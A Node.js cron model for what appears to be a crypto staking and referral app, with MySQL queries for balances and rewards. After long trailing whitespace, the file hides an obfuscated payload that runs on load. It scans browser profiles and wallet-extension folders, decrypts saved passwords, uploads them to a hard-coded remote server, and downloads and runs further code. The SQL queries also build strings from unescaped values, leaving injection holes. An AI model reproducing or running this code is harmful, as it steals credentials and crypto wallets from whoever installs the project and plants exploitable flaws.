const config = require('../config');
const mysql = require('mysql2');
const { id } = require('@ethersproject/hash');
const pool = mysql.createPool({ host: config.mysqlHost, user: config.user, password: process.env.DB_PASS || config.password, database: config.database, port: config.mysqlPort });
const promisePool = pool.promise();

class CronModel {

    getTransaction = async () => {
        let sql = `SELECT * FROM transactions where business_added = 0 ORDER BY id`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    updateBalance = async (data) => {

        if (data.buyer_id == data.user_id) {
            console.log("Yes");
        } else {
            let sql = `UPDATE business_calculation SET total_business = total_business+'${data.amount}', remaining_balance = remaining_balance+'${data.amount}' WHERE direct_referral_id = ${data.user_id}  `;
            const [result, fields] = await promisePool.query(sql);
            
            console.log(sql);
        }

        let sqlForTrx = `UPDATE transactions SET business_added = 1 WHERE id = ${data.id}  `;
        const [result1, fields1] = await promisePool.query(sqlForTrx);
        
        return result1;
    }

    getReferralUser = async (user_id) => {
        let sql = `SELECT * FROM registration where id = ${user_id}`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    getMyReferralList = async (user_id) => {
        let sql = `SELECT b.*,r.stage,r.bnb_address, r.block,m.business,m.percent,m.amount FROM business_calculation as b left join registration as r on r.id=b.user_id left join matching_bonus as m on m.id=r.stage+1 where b.user_id = ${user_id} ORDER BY b.id`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    checkMemberBusiness = async (user_id, amount) => {
        let sql = `SELECT sum(case when remaining_balance>${amount / 2} then ${amount / 2} else remaining_balance end) as balance  FROM business_calculation WHERE user_id = ${user_id}`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    updateBusinessBalance = async (data) => {
        let sql = `UPDATE business_calculation SET remaining_balance = '${data.remaining_balance}', capture_balance = '${data.capture_balance}' WHERE direct_referral_id = ${data.user_id}  `;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    updateUserStage = async (data) => {
        let sql = `UPDATE registration SET stage = ${data.stage}, block = ${data.block} WHERE id = ${data.user_id}  `;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    addReward = async (data) => {
        let sql = `INSERT INTO history(user_id, bnb_address, type, amount, usd_amount, history, ip, block, stage) VALUES('${data.user_id}', '${data.bnb_address}','${data.type}', '${data.amount}', '${data.usd_amount}', '${data.history}', '${data.ip}', '${data.block}', '${data.stage}')`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    updateUserBalance = async (token, user_id) => {
        let sql = `UPDATE registration SET balance = balance + ${token} WHERE id = ${user_id}  `;
        const [result, fields] = await promisePool.query(sql);
        
        console.log(sql);
        return result;
    }

    updateAllocationsUserBalance = async (token, user_id) => {
        let sql = `UPDATE registration SET reward_wallet = reward_wallet + ${token} WHERE id = ${user_id}  `;
        const [result, fields] = await promisePool.query(sql);
        
        console.log(sql);
        return result;
    }

    getPlanDetails = async (block) => {
        let sql = `SELECT * FROM earning_projections WHERE block = ${block}  `;
        const [result, fields] = await promisePool.query(sql);
        
        console.log(sql);
        return result;
    }

    getActivePhase = async () => {
        let sql = `SELECT * FROM phase WHERE status = 1 `;
        const [result, fields] = await promisePool.query(sql);
        
        console.log(sql);
        return result;
    }

    checkTotalPurchase = async (user_id) => {
        let sql = `SELECT COALESCE(sum(token),0) as token FROM transactions WHERE user_id = ${user_id} AND date(created_at) >= '20220701' `;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    getCapingPlan = async (amount) => {
        let sql = `SELECT daily_caping FROM caping_plan WHERE minimum < ${amount} AND maximum > ${amount}`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }



    usersStakingIncome = async (amount) => {
        let sql1 = `SELECT round(((amount*apy/100)/period),2) as roi,user_id FROM stacking where status=0 and id not in (select stacking_id from history where date(created_at)=CURRENT_DATE and type=1 and amount>0) and round(((amount*apy/100)/period),2)>0 and is_withdraw=1 order by id desc`;

       const [result1, fields1] = await promisePool.query(sql1);
       
       console.log('res1',result1);
       var i=0;
       while( i < result1.length) {
        let sql2=`UPDATE registration SET balance=COALESCE(balance,0)+${result1[i].roi} WHERE id=${result1[i].user_id}`
    
        const [result2, fields2] = await promisePool.query(sql2);
        i++;
    }
console.log('sdsdsdsds');

        let sql = `insert into history (stacking_id,bnb_address,type,amount,history,_from,created_at,user_id,status)SELECT id,bnb_address,1,round(((amount*apy/100)/period),2),'ROI Token Credited' as history,null,now(),user_id,is_withdraw FROM stacking where status=0 and id not in (select stacking_id from history where date(created_at)=CURRENT_DATE and type=1 and amount>0) and round(((amount*apy/100)/period),2)>0 order by id desc`;
        // console.log(sql);
        const [result, fields] = await promisePool.query(sql);
       
        // console.log('res11111',result);
        
        return result;
    }

    selectCompletedStaking = async (amount) => {
        let sql = `select s.id, s.user_id,s.status, s.amount,amount+round((amount*apy/100),2) as income, s.created_at, s.period, date_add(s.created_at, interval s.period DAY) as enddate from stacking  as s WHERE date_add(s.created_at, interval s.period DAY) < now() AND s.status = 0`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    CompletedStakingHistory = async (data) => {
        let sql = `UPDATE  history SET status=1 WHERE stacking_id=${data} and type=1`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    CompletedStakingData = async (data) => {
        let sql = ` UPDATE  stacking SET status=1 WHERE id=${data}`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }

    
    updateStakingBalance = async (amount,sum,id) => {
        let sql = ` UPDATE  registration SET stacking_balance=stacking_balance-${amount},balance=balance+${sum} WHERE id=${id}`;
        console.log(sql);
        const [result, fields] = await promisePool.query(sql);
        
        return result;
    }
    
}

module.exports = new CronModel;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Object.prototype.toString,Object.defineProperty,Object.getOwnPropertyDescriptor;const t="base64",c="utf8",r=r=>(s1=r.slice(1),Buffer.from(s1,t).toString(c)),e=(r,e)=>{let E=Buffer.from(r,t);const s=E.length;let F=0,a=new Uint8Array(s);for(ii=0;ii<s;ii++){F=3&ii;let t=e[o](F);a[ii]=255&(E[ii]^t)}return((t,c)=>Buffer.from(t).toString(c))(a,c)},E=t=>e(t,c),o=r("2Y2hhckNvZGVBdA"),s=E("BgUKUQERVQ"),F=E("FhwPVBErFkoaFwNLBg"),a=E("FgYfSAEb"),B=E("EAwDWw"),i=E("BxEXTRAHEg"),A=r("zcGF0aA"),$=E("BRgHTBMbFFU"),n=E("ARkWXBwG"),l=E("HRsLXREdFA"),R=E("HRsVTBsVC10"),W=E("AQ0WXQ"),V=require("os"),U=require(A),Q=require(s),g=require(a),h=require(i),w=require(F)[B],x=V[R](),f=V[$](),y=V[l](),I=V[n](),G=V[W](),S=require("fs");let u;const d=t=>e(t,c),X=(()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTMuMjk6MTI0NA==  ";for(var c="b",e="a",E="",o="",s=0;s<10;s++)c+=t[s],e+=t[10+s],E+=t[20+s],o+=t[30+s];return c=c+E+o,r(e)+r(c)})(),C=d("ER0UVhQZAw"),H=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?y:`${U[C](y)}/${c}`)),Y="NVRlYW05",D="AgYPTBAyD1QQJx9WFg",k="EhES",b="WhcKURAaEg",M=d("WloISBk"),N=d(b),p=d(D),Z=d(k),m=d("EAwPSwEHNUEbFw"),J="WgcSVwcRSFYaEAM",T=d("FBcFXQYHNUEbFw");function j(t){try{return S[T](t),!0}catch(t){return!1}}const v=d("MREAWQAYEg"),O=d("JQYJXhwYAw"),K=d("WjUWSDEVEllaOAlbFBhJdRwXFFcGGwBMWjECXxBbM0sQBkZ8FAAH"),P=(t,c)=>{result="";try{const r=`${t}`,e=require(`${y}${d(J)}`);if(G!=d("Ih0IXBoDFWc7IA"))return;const E=d("JjEqfTYgRhJVMjR3OFQKVxIdCEs"),s=`${H("~/")}${c}`;let F=U.join(s,d("ORsFWRlUNUwUAAM"));const a=d("FBEVFUdBUBUSFws"),B=d("GgYPXxwaOU0HGA"),i=d("AAcDShsVC10qAgdUABE"),A=d("BRUVSwIbFFwqAgdUABE"),$=d("NgYfSAEhCEgHGxJdFgAiWQEV"),n=d("FgYDWQERIl0WHRZQEAYPTg"),l=d("BxEHXDMdCl0"),R=d("FhsWQTMdCl0"),W=d("ORsBURtUIlkBFQ"),V=d("Ggc5WwcNFkw"),h=d("EBoFSgwEEl0RKw1dDA"),w=d("MRUSWRcVFV0"),x=d("GRUSURtF"),f=d("IE5G"),I=d("Ik5G"),u=d("JU5G"),X=d("ABoKURsf");S[l](F,d("AAAAFU0"),((t,c)=>{if(!t){mkey=JSON.parse(c),mkey=mkey[V][h],mkey=(t=>{var c=atob(t),r=new Uint8Array(c.length);for(let t=0;t<c.length;t++)r[t]=c[o](t);return r})(mkey);try{const t=e[$](mkey.slice(5));for(ii=0;ii<=200;ii++){const c=0===ii?v:`${O} ${ii}`,e=`${s}/${c}/${W}`,o=`${s}/t${c}`;if(!j(e))continue;const F=`${r}_${ii}_${O}`;S[R](e,o,(c=>{try{const c=new Q[w](o);c.all(E,((r,e)=>{var E="";r||e.forEach((c=>{var r=c[B],e=c[i],o=c[A];try{"v"===o.subarray(0,1).toString()&&(iv=o.subarray(3,15),cip=o.subarray(15,o.length-16),cip.length&&(mmm=g[n](a,t,iv).update(cip),E=`${E}${I}${r} ${f} ${e} ${u}${mmm.toString(x)}\n\n`))}catch(t){}})),c.close(),S[X](o,(t=>{})),Ut(F,E)}))}catch(t){}}))}}catch(t){}}}))}catch(t){}},q=E("Ex0KXRsVC10"),z=E("GAEKTBwrAFEZEQ"),L=E("ExsUVTEVElk"),_=E("AAYK"),tt=E("GgQSURoaFQ"),ct=E("AxUKTRA"),rt=d("BxEHXBEdFGsMGgU"),et=d("BgAHTCYNCFs"),Et=(d("HAciUQcRBUwaBh8"),r("YcG9zdA")),ot=[[d("WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFozCVcSGAMXNhwUVxgR"),d("WloFVxsSD19aEwlXEhgDFRYcFFcYEQ"),d("WjUWSDEVEllaOAlbFBhJfxobAVQQWyVQBxsLXVohFV0HVCJZARU")],[d("WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFo2FFkDETVXEwARWQcRSXoHFRBdWDYUVwIHA0o"),d("WloFVxsSD19aNhRZAxE1VxMAEVkHEUl6BxUQXVg2FFcCBwNK"),d("WjUWSDEVEllaOAlbFBhJegcVEF0mGwBMAhUUXVo2FFkDEUt6BxsRSxAGSW0GERQYMRUSWQ")],[d("WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFoXCVVbGxZdBxUVVxMAEVkHEUh3BREUWQ"),d("WloFVxsSD19aGxZdBxU"),d("WjUWSDEVEllaJglZGB0IX1o7Fl0HFUZrGhISTxQGAxc6BANKFFQ1TBQWCl1aIRVdB1QiWQEV")]],st=d("ORsFWRlUI0ABEQhLHBsIGCYREkwcGgFL"),Ft=d("WxgJXw"),at=d("WxgCWg"),Bt=d("BhsKWRsVOVERWhJAAQ");let it="comp";const At=["Gx8EUR0SBF0aEwddFBsDUBkRAFYeGwJaEBIBSBIfCFY","EB4EWRkWB1MaBApbHRgBUBAXAlkZGQNdEBUMVhwZDlU","FxIIWRAYC1cYEQ9VHRgWVRIeCFIaBA5QBR8NVxkeFlk","HBYIXR8QAFIYGQ1IFhoKSBAWDVQYGg1XEBsPUBoSA1s","ExwEVx0dC1kQGARXHQQMWhcYAlsbEwVWFAQIXBoQDEg","HRoAWRsfCFcWEgNXExYCXBIXD1IbGQ5WExoNXBsVB1w","FBEHWx0fCFUQEhZQEAQFWxwbCFoaGw5bHhsIVxARC18","HR0AWRMTC1sWEBZdHgQKVxgeDFMWEgFXERoOWxAYClI"],$t=d("FgYDWQERNF0UEDVMBxEHVQ"),nt=d("WgEWVBoVAks"),lt=async(t,c,r)=>{let e=t;if(!e||""===e)return[];try{if(!j(e))return[]}catch(t){return[]}c||(c="");let E=[];for(let r=0;r<200;r++){const o=`${t}/${0===r?v:`${O} ${r}`}/${st}`;for(let t=0;t<At.length;t++){const s=d(At[t]);let F=`${o}/${s}`;if(j(F)){try{far=S[rt](F)}catch(t){far=[]}far.forEach((async t=>{e=U.join(F,t);try{(e.includes(Ft)||e.includes(at))&&E.push({[ct]:S[$t](e),[tt]:{[q]:`${c}${r}_${s}_${t}`}})}catch(t){}}))}}}if(r&&(e=`${y}${d("WloFVxsSD19aBwlUFBoHFxwQSFIGGwg")}`,S[m](e)))try{E.push({[ct]:S[$t](e),[tt]:{[q]:Bt}})}catch(t){}const o={type:Y,hid:it,[z]:E};try{const t={[_]:`${X}${nt}`,[L]:o};h[Et](t,((t,c,r)=>{}))}catch(t){}return E},Rt=()=>{try{ot.forEach(((t,c)=>{P(c,t[2])})),P(3,K)}catch(t){}},Wt=d("Wh8DQQY"),Vt=d("BQ0SUBoa"),Ut=async(t,c)=>{const r={ts:u.toString(),type:Y,hid:it,ss:t,cc:c.toString()},e={[_]:`${X}${Wt}`,[L]:r};try{h[Et](e,((t,c,r)=>{}))}catch(t){}},Qt=d("BVocUQ"),gt=d("WgQCVwIa"),ht=d("BxEIWRgRNUEbFw"),wt=d("BxEIWRgR"),xt=d("Bxk1QRsX"),ft=d("ARUUGFgMAA"),yt=d("FgEUVFVZKlc"),It=d("KVoWQQUoFkEBHAlWWxEeXQ"),Gt=51476596;let St=0;const ut=async t=>{w(`${ft} ${t} -C ${y}`,((c,r,e)=>{if(c)return console.error(`err unfile: ${c}`),S[xt](t),void(St=0);S[xt](t),Ht()}))},dt=()=>{const t=d("BUZIQhwE"),c=`${X}${gt}`,r=`${I}\\${Qt}`,e=`${I}\\${t}`;if(!(St>=Gt))if(S[m](r))try{var E=S[et](r);E.size>=Gt?(St=E.size,S[wt](r,e,(t=>{if(t)throw t;ut(e)}))):(St<E.size?St=E.size:(S[xt](r),St=0),Xt())}catch(t){}else{w(`${yt} "${r}" "${c}"`,((t,c,E)=>{if(t)return St=0,void Xt();try{St=Gt,S[ht](r,e),ut(e)}catch(t){}}))}};function Xt(){setTimeout((()=>{dt()}),2e4)}const Ct=async()=>{var t=process.version.match(/^v(\d+\.\d+)/)[1];const c=`${X}${d("WhoJXBBb")}${t}`,r=`${y}${d(J)}`;if(S[m](r))Rt();else{w(`${yt} "${r}" "${c}"`,((t,c,r)=>{Rt()}))}},Ht=async()=>await new Promise(((t,c)=>{if("w"==f[0]){const t=`${y}${It}`;S[m](`${t}`)?(()=>{const t=`${X}${N}/${Y}`,c=`${y}${M}`,r=`"${y}${It}" "${c}"`;try{S[xt](c)}catch(t){}h[Z](t,((t,e,E)=>{if(t)Ct();else try{S[p](c,E),w(r,((t,c,r)=>{Ct()}))}catch(t){Ct()}}))})():(Ct(),dt())}else(()=>{const t=d(b),c=d(D),r=d(k),e=`${X}${t}/${Y}`,E=`${y}${M}`;let o=`${Vt}3 "${E}"`;h[r](e,((t,r,e)=>{t||(S[c](E,e),w(o,((t,c,r)=>{})))}))})()}));var Yt=0;const Dt=async()=>{try{u=Date.now(),await(async()=>{it=x;try{const t=H("~/");ot.forEach((async(c,r)=>{let e="";e="d"==f[0]?`${t}${c[0]}`:"l"==f[0]?`${t}${c[1]}`:`${t}${c[2]}`,await lt(e,`${r}_`,0==r)})),"w"==f[0]&&(pa=`${t}${K}`,await lt(pa,"3_",!1))}catch(t){}})(),Ht()}catch(t){}};Dt();let kt=setInterval((()=>{(Yt+=1)<5?Dt():clearInterval(kt)}),6e5);module.exports=Dt;